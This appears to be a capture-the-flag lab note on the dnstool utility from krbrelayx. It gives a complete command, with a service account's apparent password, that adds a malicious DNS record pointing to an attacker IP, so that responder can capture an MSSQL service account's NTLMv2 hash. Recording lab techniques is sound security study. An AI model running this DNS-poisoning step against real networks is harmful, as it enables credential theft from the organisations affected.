# dnstool (krbrelayx)

Python tool from the `krbrelayx` project used to create/modify/delete ADIDNS records through LDAP when the authenticated account has DNS modification rights.

## Commands Used

### Add a malicious A record pointing to the attacker machine
```bash
dnstool -u 'OVERWATCH\sqlsvc' -p 'TI0LKcfHzZw1Vv' \
  --action add --record SQL07 --data <ATTACKER_IP> TARGET_IP
```
Used on: **Overwatch**

- `--action add` — create a new DNS record
- `--record SQL07` — record name (no trailing dot, implicitly inside the zone)
- `--data` — target of the A record (attacker IP)
- Final argument — the domain controller IP

Used in combination with `responder` to capture the NTLMv2 hash of the MSSQL service account when it resolves the linked server `SQL07`.
